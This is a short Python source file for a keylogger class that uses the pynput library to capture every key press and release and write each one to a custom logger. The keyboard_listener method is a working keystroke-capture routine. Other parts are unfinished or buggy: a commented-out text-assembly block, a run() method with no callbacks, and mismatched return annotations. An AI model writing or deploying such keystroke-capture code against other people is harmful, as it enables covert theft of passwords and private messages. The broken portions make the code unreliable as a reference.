from pynput.keyboard import Listener
# import pynput
# if o pc for windows:
# from pynput.keyboard._win32 import KeyCode
from pynput import keyboard
from Loggers.Logger import Logger

logger = Logger()

class KeyLogger(Logger):

    def __init__(self):
        self.keys = []
        self.text = ""

    def set_keys(self, key: dict) -> None:
        self.keys.append(key)
        
    def get_keys(self) -> list:
        return self.keys

    def on_press(self, key) -> str:
        logger.log_debug(message=f"{key} pressed")
        logger.log_info(message=f"{key}", key_press=key)
        # logger.log_warn(message=f"{key.__class__}")
        
        # functions_keys = ["Key.enter", 
        #                   "Key.tab", 
        #                   "Key.esc"]

        # if self.get_keys():
        #     if isinstance(key, str) or key.space:       
        #         self.text =+ key
        #     if str(key) in functions_keys:
        #         print(self.text)
        #         self.set_keys(self.text)
        #         self.text = "" 
        # else:

        
    def on_release(self, key) -> str:
        logger.log_debug(message=f"{key} released")
        
    def keyboard_listener(self) -> None:    
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        listener.stop()
            
    def run(self):
        with Listener() as listener:
            listener.join()
            
